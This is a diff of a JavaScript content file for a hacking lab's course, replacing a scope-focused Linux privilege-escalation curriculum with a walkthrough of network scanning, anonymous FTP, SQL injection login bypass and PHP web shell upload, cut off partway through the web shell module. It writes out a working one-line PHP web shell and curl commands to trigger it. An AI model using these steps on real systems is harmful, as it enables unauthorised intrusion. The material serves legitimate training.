@@ -1,273 +1,650 @@
-const refs = {
-  wireguard: { title: 'WireGuard Quick Start', url: 'https://www.wireguard.com/quickstart/' },
-  credentials: { title: 'Linux credentials(7)', url: 'https://man7.org/linux/man-pages/man7/credentials.7.html' },
-  kernelCredentials: { title: 'Linux kernel: Credentials in Linux', url: 'https://kernel.org/doc/html/latest/security/credentials.html' },
-  capabilities: { title: 'Linux capabilities(7)', url: 'https://man7.org/linux/man-pages/man7/capabilities.7.html' },
-  inode: { title: 'Linux inode(7)', url: 'https://man7.org/linux/man-pages/man7/inode.7.html' },
-  path: { title: 'Linux path_resolution(7)', url: 'https://man7.org/linux/man-pages/man7/path_resolution.7.html' },
-  execve: { title: 'Linux execve(2)', url: 'https://man7.org/linux/man-pages/man2/execve.2.html' },
-  proc: { title: 'Linux proc(5)', url: 'https://man7.org/linux/man-pages/man5/proc.5.html' },
-  find: { title: 'GNU find manual', url: 'https://www.gnu.org/software/findutils/manual/html_mono/find.html' },
-  coreutils: { title: 'GNU Coreutils: file permissions', url: 'https://www.gnu.org/software/coreutils/manual/html_node/File-permissions.html' },
-  sudoers: { title: 'Official sudoers(5)', url: 'https://www.sudo.ws/docs/man/1.9.14/sudoers.man.pdf' },
-  systemdService: { title: 'systemd.service official source manual', url: 'https://github.com/systemd/systemd/blob/main/man/systemd.service.xml' },
-  systemdExec: { title: 'systemd.exec official source manual', url: 'https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml' },
-  systemdTimer: { title: 'systemd.timer official source manual', url: 'https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml' },
-  mitreSuid: { title: 'MITRE ATT&CK T1548.001 — Setuid and Setgid', url: 'https://attack.mitre.org/techniques/T1548/001/' },
-  mitreSudo: { title: 'MITRE ATT&CK T1548.003 — Sudo and Sudo Caching', url: 'https://attack.mitre.org/techniques/T1548/003/' },
-  mitrePath: { title: 'MITRE ATT&CK T1574.007 — PATH Environment Variable', url: 'https://attack.mitre.org/techniques/T1574/007/' },
-  mitreCron: { title: 'MITRE ATT&CK T1053.003 — Cron', url: 'https://attack.mitre.org/techniques/T1053/003/' },
-  mitreSecrets: { title: 'MITRE ATT&CK T1552.001 — Credentials In Files', url: 'https://attack.mitre.org/techniques/T1552/001/' },
+﻿const refs = {
+  arpScan: { title: 'arp-scan(1) - The ARP Scanner Manual', url: 'https://linux.die.net/man/1/arp-scan' },
+  nmap: { title: 'Nmap Network Scanning - Official Reference', url: 'https://nmap.org/book/man.html' },
+  vsftpd: { title: 'vsftpd.conf(5) Configuration Reference', url: 'https://man.cx/vsftpd.conf(5)' },
+  owaspSqli: { title: 'OWASP SQL Injection Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
+  owaspUpload: { title: 'OWASP File Upload Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html' },
+  ssh: { title: 'OpenSSH Client Manual (ssh)', url: 'https://man.openbsd.org/ssh.1' },
+  gtfobinsFind: { title: 'GTFOBins: find Sudo Functionality', url: 'https://gtfobins.github.io/gtfobins/find/#sudo' },
+  sudoers: { title: 'Official sudoers(5) Manual', url: 'https://www.sudo.ws/docs/man/1.9.14/sudoers.man.pdf' },
+  mitreSudo: { title: 'MITRE ATT&CK T1548.003 - Sudo and Sudo Caching', url: 'https://attack.mitre.org/techniques/T1548/003/' },
+  mitreSecrets: { title: 'MITRE ATT&CK T1552.001 - Credentials In Files', url: 'https://attack.mitre.org/techniques/T1552/001/' },
 };
 
 export const learnTracks = [
-  { id: 'foundation', number: 'A', title: 'Foundation', description: 'Set boundaries, understand Linux identity, and use a repeatable methodology.' },
-  { id: 'discovery', number: 'B', title: 'Discovery', description: 'Map the host, processes, services, filesystem, and relationships between them.' },
-  { id: 'boundaries', number: 'C', title: 'Privilege boundaries', description: 'Analyze the mechanisms that can move execution into a higher-privileged context.' },
-  { id: 'delivery', number: 'D', title: 'Evidence and lab delivery', description: 'Handle secrets, prove findings minimally, and deliver a lab that can be reviewed.' },
+  { id: 'recon', number: '01', title: 'Reconnaissance & Discovery', description: 'Local network host identification via ARP and complete port/service enumeration using Nmap.' },
+  { id: 'web-exploitation', number: '02', title: 'Web Exploitation & Initial Access', description: 'Anonymous FTP intelligence gathering, SQL injection auth bypass, and PHP webshell execution.' },
+  { id: 'lateral-privesc', number: '03', title: 'Lateral Movement & Privilege Escalation', description: 'Harvesting leaked credentials, pivoting via SSH for the user flag, and escaping via sudo find to root.' },
+  { id: 'remediation', number: '04', title: 'Hardening & Defensive Remediation', description: 'Fixing anonymous FTP access, applying PDO prepared statements, and enforcing least-privilege sudoers.' },
 ];
 
 export const learnModules = [
+  // -------------------------------------------------------------------------
+  // Module 1: Network Discovery
+  // -------------------------------------------------------------------------
   {
-    id: 'scope', track: 'foundation', title: 'Scope and operating rules', minutes: 8,
-    objective: 'Define the target, testing boundaries, and stop conditions before running the first command.',
-    intro: 'Privilege escalation is not a race to run the most commands. Build an evidence chain on the assigned target, prove one boundary safely, and stop as soon as the intended evidence appears.',
-    outcomes: ['Distinguish the public portal from private WireGuard targets.', 'Write a scope statement a mentor can verify.', 'Define stop conditions and data that must not be collected.'],
-    diagram: { src: '/learn/pe-workflow.svg', alt: 'Privilege-escalation workflow from scope to hardening.', caption: 'Use the same sequence for every challenge so the evidence chain stays intact.' },
-    sections: [
-      { id: 'contract', title: 'Testing contract', paragraphs: ['Use only the attacker peer and target peer assigned by the portal. The target IP comes from Lab Space; do not run subnet-wide scans, password guessing, persistence, denial of service, or tests against systems outside LAS.', 'Prefer read-only commands. If an action can change a service, permission, user, scheduler, or data, confirm that it is part of the intended path and can be safely reverted.'], bullets: ['Target: one WireGuard IP displayed by the portal.', 'Goal: the challenge flag or the specified boundary evidence.', 'Stop condition: the flag is proven, the target becomes unstable, or the scope is unclear.', 'Evidence: timestamp, identity, command, relevant output, interpretation, and remediation.'] },
-      { id: 'baseline', title: 'Baseline before enumeration', paragraphs: ['A baseline binds every observation to the correct host and identity. Save it before doing any other analysis.'], commands: [
-        { label: 'Scope snapshot', value: 'date -Is\nhostname\nid\npwd', explanation: '`date -Is` provides an ISO-8601 timestamp; `id` shows UID, GID, and supplementary groups.', lookFor: 'Target hostname, non-root user, working directory, and a consistent start time.', output: '2026-08-31T20:05:14+07:00\nlab-2625\nuid=1001(labuser) gid=1001(labuser) groups=1001(labuser),1005(backup)\n/home/labuser' },
-        { label: 'Operating-system context', value: 'cat /etc/os-release\nuname -a', explanation: 'Distribution and kernel are analysis context, not proof of a vulnerability.', lookFor: 'Ubuntu 24.04 or an image approved by the mentor; never choose a kernel exploit from a version string alone.' },
-      ] },
-      { id: 'boundaries', title: 'Do not cross the boundary', paragraphs: ['Do not delete files, edit sudoers, install persistence, enable new services, read unrelated data, or copy private keys. A good finding uses the smallest possible proof and includes a fix.'], callout: { kind: 'danger', title: 'Stop and ask', text: 'Stop if the IP differs from the portal, the target appears to belong to someone else, a command could affect availability, or the challenge asks for a technique outside scope.' } },
+    id: 'network-discovery',
+    track: 'recon',
+    title: 'Local Network Discovery & Host Identification',
+    minutes: 10,
+    objective: 'Locate the target virtual machine on the local network using link-layer ARP scanning.',
+    intro: 'In lab environments, target machines typically receive a dynamic IP via DHCP. Before any enumeration can begin, you need to figure out which IP belongs to the target - not your gateway, not your own machine. ARP is the most reliable tool for this on a local segment.',
+    outcomes: [
+      'Understand why ARP works even when ICMP ping is blocked.',
+      'Use arp-scan to enumerate active hosts on the local interface.',
+      'Distinguish the target VM from gateways and hypervisors using MAC OUI.',
     ],
-    mistakes: ['Starting a scan before confirming the target IP.', 'Treating a version string as exploit proof.', 'Running every command at once without a hypothesis.', 'Saving passwords, tokens, or private keys in evidence.'],
-    checkpoint: { prompt: 'Write the scope in one sentence.', tasks: ['Name the attacker peer and target IP.', 'Name one intended success condition.', 'Name three prohibited actions.', 'Save the baseline as evidence/00-scope.txt.'] },
-    references: [refs.wireguard, refs.credentials],
+    diagram: {
+      src: '/learn/enumeration-funnel.svg',
+      alt: 'Reconnaissance funnel from broad host discovery to specific target profiling.',
+      caption: 'Isolate the single target host before executing port and version scans.',
+    },
+    sections: [
+      {
+        id: 'arp-theory',
+        title: 'Why ARP works on local networks',
+        paragraphs: [
+          'ARP operates at Layer 2, below the IP stack. Unlike ICMP ping, it cannot be filtered by standard host-based firewalls - a machine that blocks all ping requests still must answer ARP queries to function on the network.',
+          'Virtual machines expose their virtualization platform through the MAC vendor prefix (OUI). This is often your clearest signal for identifying which responding host is the target versus infrastructure.',
+        ],
+        bullets: [
+          'ARP replies are mandatory - hosts cannot silently ignore them.',
+          'MAC vendor prefix (OUI) reveals the adapter type, helping distinguish VMs from physical machines.',
+          'More reliable than ping on networks with ICMP restrictions.',
+        ],
+      },
+      {
+        id: 'running-arp',
+        title: 'Running a local subnet scan',
+        paragraphs: [
+          'Scan your network interface and look for hosts you do not recognize. Pay attention to the vendor column - virtualization platforms have distinctive OUI prefixes.',
+        ],
+        commands: [
+          {
+            label: 'ARP scan of local subnet',
+            value: 'sudo arp-scan --localnet',
+            explanation: 'Sends ARP queries to every valid address on the local interface and reports responding hosts with their MAC vendor.',
+            lookFor: 'An unfamiliar IP whose MAC vendor matches a virtualization platform.',
+          },
+          {
+            label: 'Verify reachability',
+            value: 'ping -c 3 <TARGET_IP>',
+            explanation: 'Confirm basic connectivity to the candidate IP once identified.',
+            lookFor: 'Low round-trip time and 0% packet loss.',
+          },
+        ],
+        callout: {
+          kind: 'info',
+          title: 'Save the target IP',
+          text: 'Store the confirmed address in a shell variable (`export TARGET=<TARGET_IP>`) so all subsequent commands stay consistent throughout your session.',
+        },
+      },
+    ],
+    mistakes: [
+      'Scanning a broad range when only the local subnet matters.',
+      'Treating an ICMP non-response as "host offline" - ARP may still reply.',
+      'Mistaking the default gateway for the target machine.',
+    ],
+    checkpoint: {
+      prompt: 'Confirm target identification before moving forward.',
+      tasks: [
+        'Run arp-scan and list every responding host with its MAC vendor.',
+        'Identify the target based on vendor information and context.',
+        'Confirm basic network reachability before proceeding to port scanning.',
+      ],
+    },
+    references: [refs.arpScan],
   },
+
+  // -------------------------------------------------------------------------
+  // Module 2: Port & Service Enumeration
+  // -------------------------------------------------------------------------
   {
-    id: 'identity', track: 'foundation', title: 'Linux identity and permissions', minutes: 14,
-    objective: 'Understand the identity Linux uses when deciding whether an operation is allowed.',
-    intro: 'A username is only a label. Permission checks depend on real and effective identities, supplementary groups, capabilities, owner, group, mode, ACLs, and every component of an object path.',
-    outcomes: ['Distinguish RUID, EUID, GID, and supplementary groups.', 'Read symbolic and octal modes.', 'Explain permission as subject → object → operation → consequence.'],
-    diagram: { src: '/learn/linux-identity.svg', alt: 'Linux identity and permission-check flow.', caption: 'Effective identity and groups are compared with object metadata and kernel policy.' },
-    sections: [
-      { id: 'credentials', title: 'A process identity', paragraphs: ['Real UID identifies who started a process. Effective UID and GID are used by many permission checks. Supplementary groups can grant additional access. SUID, SGID, and capabilities can change execution context without changing the login name.'], commands: [
-        { label: 'Current identity', value: 'id\nid -u\nid -g\nid -G\ngroups', explanation: '`id -u` and `id -g` show effective IDs; `id -G` shows every group ID.', lookFor: 'Groups such as backup, docker, adm, or a challenge-specific group are leads, not proof.', output: 'uid=1001(labuser) gid=1001(labuser) groups=1001(labuser),1005(backup)' },
-        { label: 'Account databases', value: "getent passwd | awk -F: '$3 >= 1000 {print $1 \":\" $3 \":\" $6 \":\" $7}'\ngetent group", explanation: '`getent` reads the host name-service database, not only local files.', lookFor: 'Service accounts, login shells, home directories, and relevant memberships.' },
-      ] },
-      { id: 'modes', title: 'Owner, group, mode, and path', paragraphs: ['For a file, `r` reads, `w` modifies, and `x` executes. On a directory, `x` means traverse/search and `w` can create or remove entries when the other requirements are met. SUID and SGID are special mode bits.'], commands: [
-        { label: 'Inspect one object', value: "stat -c '%A %a %U %G %n' /path/to/file", explanation: 'The format prints symbolic mode, octal mode, owner, group, and name.', lookFor: 'Who can read, write, or execute the object.', output: '-rwxrwx--- 770 root backup /opt/ctf/check.sh' },
-        { label: 'Inspect every path component', value: 'namei -l /opt/ctf/check.sh', explanation: 'A file can look correctly protected while a parent directory is writable or not searchable.', lookFor: 'Writable directories before the file, symlinks, or ownership changes along the path.' },
-      ] },
-      { id: 'reasoning', title: 'How to conclude', paragraphs: ['Write: `labuser + group backup → /opt/ctf/check.sh → writable → risky only if a privileged process executes the file`. The final link must be proven through service, scheduler, or process metadata.'], callout: { kind: 'info', title: 'A candidate is not proof', text: 'Mode 777, group membership, or a root-owned file does not automatically create privilege escalation. Execution context and invocation path still need proof.' } },
+    id: 'port-enumeration',
+    track: 'recon',
+    title: 'Port Enumeration & Service Profiling',
+    minutes: 12,
+    objective: 'Discover all listening services on the target and profile their versions to identify potential attack vectors.',
+    intro: 'Scanning only the default top-1000 ports is a common mistake. Non-standard services, internal management panels, and custom listeners often sit outside that range. A full sweep followed by version detection gives you the complete picture.',
+    outcomes: [
+      'Perform a full TCP port sweep with Nmap.',
+      'Extract service banners and version strings.',
+      'Triage open services by attack priority.',
     ],
-    mistakes: ['Assuming a root owner means the file runs as root.', 'Assuming 777 automatically means privilege escalation.', 'Ignoring parent directories and symlinks.', 'Changing chmod or chown during enumeration.'],
-    checkpoint: { prompt: 'Analyze one challenge path.', tasks: ['Record current identity.', 'Record file mode, owner, and group.', 'Check every parent path.', 'Write one fact that still needs proof.'] },
-    references: [refs.credentials, refs.kernelCredentials, refs.inode, refs.coreutils, refs.path],
+    sections: [
+      {
+        id: 'nmap-scan',
+        title: 'Full-range port scan and version detection',
+        paragraphs: [
+          'Run Nmap against all 65,535 TCP ports and follow up with version probing on anything that is open.',
+        ],
+        commands: [
+          {
+            label: 'Full port and version scan',
+            value: 'nmap -sV -p- <TARGET_IP>',
+            explanation: '`-p-` covers all ports; `-sV` probes open ports to extract service and version information.',
+            lookFor: 'Every open port and its associated service - note them all, even if they look uninteresting at first.',
+          },
+          {
+            label: 'Targeted NSE script scan',
+            value: 'nmap -sC -sV -p <PORT_LIST> <TARGET_IP>',
+            explanation: 'Run default NSE scripts against specific ports for additional context like authentication policies and server headers.',
+            lookFor: 'Misconfiguration hints, version-specific vulnerabilities, or services with anonymous access.',
+          },
+        ],
+      },
+      {
+        id: 'vector-triage',
+        title: 'Attack surface triage',
+        paragraphs: [
+          'Not all open ports deserve equal attention at first. Prioritize based on the attack surface each service typically presents:',
+        ],
+        bullets: [
+          'FTP (port 21): Often misconfigured to allow unauthenticated access - high priority for initial recon.',
+          'HTTP/HTTPS (port 80/443): Web applications are rich sources of injection and upload vulnerabilities.',
+          'SSH (port 22): Requires authentication - lower initial priority, but becomes valuable once credentials surface elsewhere.',
+        ],
+        callout: {
+          kind: 'info',
+          title: 'Methodology',
+          text: 'Resist jumping straight to brute force. Gather intelligence from application-layer services first - credentials almost always leak through misconfigurations, not brute force.',
+        },
+      },
+    ],
+    mistakes: [
+      'Stopping at top-1000 ports and missing non-standard services.',
+      'Brute-forcing SSH before exhausting FTP and web enumeration.',
+      'Not recording version strings - they matter for vulnerability research.',
+    ],
+    checkpoint: {
+      prompt: 'Document the complete service inventory.',
+      tasks: [
+        'List every open port with its service name and version string.',
+        'Mark which services may allow unauthenticated access.',
+        'Rank services by attack priority before proceeding.',
+      ],
+    },
+    references: [refs.nmap],
   },
+
+  // -------------------------------------------------------------------------
+  // Module 3: FTP Anonymous Access
+  // -------------------------------------------------------------------------
   {
-    id: 'method', track: 'foundation', title: 'Enumeration methodology', minutes: 12,
-    objective: 'Turn enumeration output into a narrow, testable hypothesis.',
-    intro: 'A command list is not a methodology. A methodology explains why a command is run, what it is looking for, and what evidence is required before moving on.',
-    outcomes: ['Use the baseline → inventory → anomaly → hypothesis → proof funnel.', 'Prioritize candidates by reachability, control, and privilege.', 'Keep observations separate from inferences.'],
-    diagram: { src: '/learn/enumeration-funnel.svg', alt: 'Enumeration funnel from baseline to minimal proof.', caption: 'As you move down the funnel, commands become narrower and the reason for each test becomes clearer.' },
-    sections: [
-      { id: 'loop', title: 'Repeatable loop', paragraphs: ['Start with scope and a baseline. Build a host inventory. Mark anomalies that connect user-controlled input with higher-privileged execution. Write a cause-and-effect hypothesis. Validate only the one link that is still uncertain.'], bullets: ['Observation: a fact directly present in output.', 'Inference: a possible security meaning.', 'Missing fact: a relationship that is not yet proven.', 'Next command: the narrowest read-only command that obtains that fact.'] },
-      { id: 'triage', title: 'Prioritization test', paragraphs: ['Prioritize a candidate when the current user can reach it, can control its input or dependency, and something with higher privilege consumes that input.'], commands: [
-        { label: 'Build a clean baseline', value: 'date -Is\nid\ncat /etc/os-release\nps -eo user,pid,ppid,args --forest\nss -tulpen', explanation: 'These commands show identity, host context, the process tree, and listeners without changing state.', lookFor: 'Root processes calling a challenge path, service accounts, and listeners matching the portal declaration.' },
-        { label: 'Verify one candidate', value: "stat -c '%A %a %U %G %n' /path/to/candidate\nnamei -l /path/to/candidate", explanation: 'Do not widen the scan; inspect a candidate that already has a reason.', lookFor: 'Control over a file or directory and its relationship to a privileged process.' },
-      ] },
-      { id: 'notes', title: 'Evidence note format', paragraphs: ['Use four lines for every lead: `Observed`, `Why it matters`, `Missing fact`, and `Next safe check`. This prevents a jump straight to exploitation.'], callout: { kind: 'info', title: 'One hypothesis at a time', text: 'Do not test sudo, SUID, cron, and credentials simultaneously. Resolve or discard one hypothesis so the evidence chain stays clear.' } },
+    id: 'ftp-recon',
+    track: 'web-exploitation',
+    title: 'FTP Anonymous Access & Information Leakage',
+    minutes: 12,
+    objective: 'Assess whether the FTP service allows unauthenticated access and identify any files that disclose internal information.',
+    intro: 'FTP servers configured to allow anonymous login expose whatever files sit in the public directory. Developers sometimes leave backup files, internal notes, or source code there without realizing the access policy is open to anyone on the network.',
+    outcomes: [
+      'Test anonymous login against an FTP service.',
+      'Enumerate available files including hidden dotfiles.',
+      'Analyze downloaded files for intelligence about other services on the system.',
     ],
-    mistakes: ['Running automated enumeration without reading the output.', 'Collecting excessive irrelevant data.', 'Mixing observations with conclusions.', 'Changing the target to prove a candidate.'],
-    checkpoint: { prompt: 'Build one complete hypothesis.', tasks: ['Write the observation.', 'Explain the possible consequence.', 'Name the missing fact.', 'Choose one read-only command to check it.'] },
-    references: [refs.proc, refs.find],
+    sections: [
+      {
+        id: 'anonymous-login',
+        title: 'Testing anonymous authentication',
+        paragraphs: [
+          'The FTP protocol supports a special `anonymous` account. When prompted for a password, convention is to leave it empty or enter any email-like string. A successful login drops you into the public directory.',
+        ],
+        commands: [
+          {
+            label: 'Connect to FTP',
+            value: 'ftp <TARGET_IP>',
+            explanation: 'Opens an interactive FTP session. At the name prompt, try `anonymous`.',
+            lookFor: '`230 Login successful` in the server response.',
+          },
+          {
+            label: 'Enumerate and download files',
+            value: 'ls -la\nget <filename>\nbye',
+            explanation: 'List all entries including hidden files, then download anything that looks useful.',
+            lookFor: 'Text files, backup archives, source files, or anything with an unusual extension.',
+          },
+        ],
+      },
+      {
+        id: 'review-notes',
+        title: 'Extracting intelligence from downloaded files',
+        paragraphs: [
+          'Read everything you can download. Developer notes, internal memos, and backup files often contain pointers to other services, authentication mechanisms, or known unfixed issues.',
+        ],
+        commands: [
+          {
+            label: 'Inspect a downloaded file',
+            value: 'cat <filename>',
+            explanation: 'Read the file contents carefully for any actionable intelligence.',
+            lookFor: 'References to internal endpoints, source code patterns, usernames, or security warnings left by developers.',
+          },
+        ],
+        callout: {
+          kind: 'info',
+          title: 'Think laterally',
+          text: 'A developer note mentioning a vulnerability or a hidden endpoint is not just background noise - it is a direct pointer to your next step.',
+        },
+      },
+    ],
+    mistakes: [
+      'Skipping anonymous login just because a password prompt appeared.',
+      'Running only `ls` instead of `ls -la`, missing hidden dotfiles.',
+      'Downloading files without reading them carefully.',
+    ],
+    checkpoint: {
+      prompt: 'Summarize what the FTP server disclosed.',
+      tasks: [
+        'Confirm whether anonymous access is permitted.',
+        'Enumerate and download all accessible files.',
+        'Identify any intelligence relevant to other services on the target.',
+      ],
+    },
+    references: [refs.vsftpd],
   },
+
+  // -------------------------------------------------------------------------
+  // Module 4: SQL Injection Auth Bypass
+  // -------------------------------------------------------------------------
   {
-    id: 'system-enumeration', track: 'discovery', title: 'System, process, and network', minutes: 16,
-    objective: 'Map the process tree, local services, user context, and network exposure on the target.',
-    intro: 'System enumeration connects a service seen from the attacker with its process, user, unit, configuration, and file dependencies on the target.',
-    outcomes: ['Read the process tree and /proc safely.', 'Connect sockets to process identity.', 'Distinguish service surface from vulnerability.'],
-    sections: [
-      { id: 'processes', title: 'Process context', paragraphs: ['A root process running a script is not automatically exploitable. Check its parent, arguments, identity fields, capabilities, and dependencies. Redact any secret that appears on a command line.'], commands: [
-        { label: 'Stable process tree', value: 'ps -eo user,pid,ppid,stat,lstart,args --forest', explanation: '`-e` selects all processes; `-o` selects columns; `--forest` shows parent-child relationships.', lookFor: 'Root processes running scripts from /opt, /srv, /var/www, or a home directory.' },
-        { label: 'One process in /proc', value: "tr '\\0' ' ' < /proc/<PID>/cmdline; printf '\\n'\ngrep -E '^(Name|Uid|Gid|Groups|Cap|NoNewPrivs):' /proc/<PID>/status", explanation: 'Use a candidate PID only. `cmdline` is NUL-separated; `status` shows identity and capability fields.', lookFor: 'Execution user, arguments, groups, CapEff, and `NoNewPrivs`.' },
-      ] },
-      { id: 'network', title: 'Local network surface', paragraphs: ['A listener shows a service accepting connections. The bind address distinguishes localhost, the WireGuard address, and all interfaces.'], commands: [
-        { label: 'Interfaces and routes', value: 'ip -br address\nip route', explanation: 'Confirm that the WireGuard interface and the 10.77.4.0/24 route exist.', lookFor: 'Assigned peer IP, a route through `mbc-las-w4`, and no unexpected route.' },
-        { label: 'Listening sockets', value: 'ss -tulpen', explanation: '`t/u` means TCP/UDP, `l` listening, `p` process, `e` extended, and `n` numeric.', lookFor: 'Declared challenge port, bind address, PID, and owning process.' },
-      ] },
-      { id: 'correlation', title: 'Correlate, do not guess', paragraphs: ['Build a map: `port → process → user → unit/config → file dependency`. A version banner is context only. A vulnerability exists when a broken boundary can be explained and proven.'], callout: { kind: 'danger', title: 'Keep remote probing narrow', text: 'From Kali, use one target IP and declared ports. Do not use -p-, wide UDP scans, vulnerability scripts, or password guessing.' } },
+    id: 'sqli-auth-bypass',
+    track: 'web-exploitation',
+    title: 'SQL Injection Authentication Bypass',
+    minutes: 15,
+    objective: 'Understand how dynamic SQL concatenation creates authentication bypass vulnerabilities and how to identify them.',
+    intro: 'When a web application builds SQL queries by directly embedding user input into a string, an attacker can inject SQL syntax to change the query logic. The classic target is a login form - but the same flaw appears anywhere unsanitized input reaches a database query.',
+    outcomes: [
+      'Recognize insecure SQL string concatenation patterns in source code.',
+      'Understand how comment sequences and boolean conditions can break query logic.',
+      'Test a login form for SQL injection vulnerability.',
     ],
-    mistakes: ['Reading all of /proc without a candidate.', 'Publishing secrets from process arguments.', 'Calling a localhost listener a vulnerability.', 'Running a WireGuard subnet scan.'],
-    checkpoint: { prompt: 'Build one service map.', tasks: ['Choose one declared port.', 'Find its local PID and user.', 'Find its unit or configuration.', 'Name the next read-only inspection.'] },
-    references: [refs.proc],
+    sections: [
+      {
+        id: 'vulnerable-code-pattern',
+        title: 'What makes a query injectable',
+        paragraphs: [
+          'A vulnerable authentication handler builds its query like this:',
+          '`$sql = "SELECT * FROM users WHERE username = \'" . $user . "\' AND password = \'" . $pass . "\'";`',
+          'User input is placed directly inside SQL syntax with no escaping or parameterization. Supplying a single quote breaks out of the string literal - anything after it gets interpreted as SQL, not data.',
+        ],
+      },
+      {
+        id: 'crafting-payload',
+        title: 'How payloads manipulate query structure',
+        paragraphs: [
+          'Several approaches can force a login query to return a valid session:',
+        ],
+        bullets: [
+          'Closing the string and commenting out the remainder: the password check never executes.',
+          'Injecting an `OR` condition that always evaluates to true: the query returns a row regardless of the actual password.',
+          'SQL dialects differ in comment syntax - `--`, `-- -`, `#` - and choosing the wrong one silently breaks the payload.',
+        ],
+        commands: [
+          {
+            label: 'Test a login endpoint via curl',
+            value: 'curl -i -X POST http://<TARGET_IP>/<login_path> \\\'\n  -d "username=<payload>" \\\'\n  -d "password="',
+            explanation: 'Submits a crafted POST to the login endpoint. Watch for an HTTP redirect or session cookie in the response.',
+            lookFor: 'An HTTP 302 redirect to an authenticated page, or a `Set-Cookie` header indicating a session was created.',
+          },
+        ],
+        callout: {
+          kind: 'info',
+          title: 'Use source code as a guide',
+          text: 'If you recovered a source file or backup, read how the login query is constructed. It will tell you exactly which characters to inject and which comment syntax the backend uses.',
+        },
+      },
+    ],
+    mistakes: [
+      'Using `#` comments on a backend that expects `--`, or vice versa.',
+      'Forgetting to URL-encode special characters in curl requests.',
+      'Assuming client-side form validation prevents the attack.',
+    ],
+    checkpoint: {
+      prompt: 'Assess the login form for SQL injection.',
+      tasks: [
+        'Locate the login endpoint on the web application.',
+        'Analyze any available source code for SQL query construction.',
+        'Craft a payload that alters the query logic and observe the server response.',
+      ],
+    },
+    references: [refs.owaspSqli],
   },
+
+  // -------------------------------------------------------------------------
+  // Module 5: Webshell Upload & Execution
+  // -------------------------------------------------------------------------
   {
-    id: 'filesystem-services', track: 'discovery', title: 'Filesystem and service surface', minutes: 16,
-    objective: 'Find relevant files and service dependencies without an uncontrolled filesystem scan.',
-    intro: 'Search directories that make sense for the challenge. Once a candidate is found, move from broad discovery to specific metadata and invocation-path checks.',
-    outcomes: ['Use find with an explicit start path and -xdev.', 'Interpret writable candidates correctly.', 'Perform remote checks only against declared ports.'],
-    sections: [
-      { id: 'bounded-find', title: 'Bounded file discovery', commands: [
-        { label: 'Scripts and configurations', value: "find /opt /srv /var/www /home -xdev -type f \\( -name '*.sh' -o -name '*.conf' -o -name '.env' -o -name '*.ini' \\) -print 2>/dev/null", explanation: '`-xdev` stays on one filesystem; the grouped expression selects relevant file types.', lookFor: 'Challenge-owned files, service configuration, scripts, and environment files.' },
-        { label: 'Potentially writable files', value: 'find /opt /srv /var/www /home -xdev -type f -perm /222 -print 2>/dev/null', explanation: '`-perm /222` means at least one write bit exists; it does not say who can write.', lookFor: 'Follow up with stat and current group membership.', output: '/opt/ctf/rotate.sh' },
-        { label: 'Candidate metadata', value: "file /opt/ctf/rotate.sh\nstat -c '%A %a %U %G %n' /opt/ctf/rotate.sh\nnamei -l /opt/ctf/rotate.sh", explanation: 'Identify the content type, metadata, and every path component without executing the file.', lookFor: 'A writable dependency used by a privileged process.' },
-      ] },
-      { id: 'remote', title: 'Declared service verification', commands: [
-        { label: 'From the assigned Kali attacker', value: 'ping -c 1 <TARGET_IP>\nnmap -Pn --reason -sV -p <DECLARED_PORTS> <TARGET_IP>\ncurl -i --max-time 5 http://<TARGET_IP>:<PORT>/', explanation: 'Replace placeholders only with the IP and ports displayed in Lab Space.', lookFor: 'Reachability, service banner, headers, and responses supporting the challenge hint.' },
-      ] },
-      { id: 'candidate', title: 'Candidate equation', paragraphs: ['A writable file becomes a PE candidate when three facts meet: the current user can control it, a privileged process or scheduler uses it, and the user can reach that code path. If any part is missing, discard the hypothesis.'] },
+    id: 'webshell-upload',
+    track: 'web-exploitation',
+    title: 'Arbitrary File Upload & Remote Code Execution',
+    minutes: 15,
+    objective: 'Understand how unrestricted file upload features can lead to remote code execution on a web server.',
+    intro: 'File upload functionality is common in admin dashboards. When the server fails to validate file types and allows uploaded files to be executed by the web engine, any user with upload access can plant a script that runs arbitrary commands as the web server process.',
+    outcomes: [
+      'Construct a minimal PHP web shell.',
+      'Identify upload endpoints that lack execution controls.',
+      'Trigger command execution through an uploaded file and determine the execution context.',
     ],
-    mistakes: ['Starting with `find /` without scope.', 'Using `find -exec` during enumeration.', 'Following every symlink.', 'Treating a service banner as a vulnerability.'],
-    checkpoint: { prompt: 'Choose one writable candidate.', tasks: ['Prove mode and ownership.', 'Prove who executes it.', 'Prove when or how it executes.', 'Explain why the candidate is valid or discarded.'] },
-    references: [refs.find, refs.inode, refs.path],
+    sections: [
+      {
+        id: 'crafting-shell',
+        title: 'A minimal PHP web shell',
+        paragraphs: [
+          'A web shell does not need to be complex. The simplest form accepts a command via a request parameter and passes it to a PHP built-in function like `system()`, `passthru()`, or `shell_exec()`.',
+        ],
+        commands: [
+          {
+            label: 'Create a one-line shell locally',
+            value: 'echo "<?php if(isset($_GET[\'cmd\'])){ system($_GET[\'cmd\']); } ?>" > shell.php',
+            explanation: 'Creates a PHP file that executes whatever is passed in the `cmd` query parameter.',
+            lookFor: 'A valid PHP file with no syntax errors.',
+          },
+        ],
+      },
+      {
+        id: 'upload-trigger',
+        title: 'Uploading and verifying execution',
+        paragraphs: [
+          'Find the upload form in the authenticated dashboard, then upload your shell. After uploading, determine where the file was stored - check the page source or response body. Then trigger the shell by requesting the file with a command parameter.',
+        ],
+        commands: [
+          {
+            label: 'Trigger a command via web shell',
+            value: 'curl "http://<TARGET_IP>/<upload_path>/shell.php?cmd=id"',
+            explanation: 'Sends a GET request with the `cmd` parameter to the uploaded shell.',
+            lookFor: '`uid=` output - this reveals which user the web server process is running as.',
+          },
+        ],
+        callout: {
+          kind: 'info',
+          title: 'Foothold established',
+          text: 'Confirming command output means you have code execution on the server. Use this access to explore the filesystem - configuration files and system accounts are your next targets.',
+        },
+      },
+    ],
+    mistakes: [
+      'Trying complex payloads before verifying basic command execution works.',
+      'Not URL-encoding spaces and special characters in query strings.',
+      'Guessing the upload path instead of reading the server response.',
+    ],
+    checkpoint: {
+      prompt: 'Confirm remote code execution.',
+      tasks: [
+        'Upload a minimal PHP shell via the admin upload form.',
+        'Locate the uploaded file URL from the server response.',
+        'Execute `id` through the shell and note the process owner.',
+      ],
+    },
+    references: [refs.owaspUpload],
